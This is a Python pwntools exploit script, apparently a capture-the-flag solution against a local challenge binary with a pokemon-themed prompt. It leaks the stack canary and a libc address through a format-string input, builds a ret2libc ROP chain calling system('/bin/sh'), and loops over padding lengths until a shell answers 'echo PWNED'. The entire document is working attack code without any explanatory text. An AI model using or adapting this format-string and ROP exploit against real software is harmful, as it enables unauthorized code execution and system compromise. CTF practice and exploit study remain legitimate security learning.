from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "error"

DELTA = 0x211643  # from your calc_delta.py

def run_once(pad_len: int) -> bool:
    io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

    # leak canary + libc ptr using the same format string
    io.recvuntil(b"What is your favourite pokemon?\n")
    io.sendline(b"%9$p|%1$p")
    io.recvuntil(b"I see you like...\n")
    canary_s, leak_s = io.recvline().strip().split(b"|")
    canary = int(canary_s, 16)
    leak = int(leak_s, 16)

    libc.address = leak - DELTA

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    payload  = b"A" * pad_len
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    io.recvuntil(b"Tell me more about your pokemon\n")
    io.send(payload)

    # if we got a shell, this should succeed
    io.sendline(b"echo PWNED")
    out = io.recv(timeout=0.5) or b""
    io.close()
    return b"PWNED" in out

def main():
    for pad in [0x20, 0x28, 0x30, 0x38, 0x40]:
        ok = run_once(pad)
        print(f"pad={hex(pad)} -> {'OK' if ok else 'FAIL'}")
        if ok:
            print(f"[+] Correct pad length is {hex(pad)}")
            break

if __name__ == "__main__":
    main()
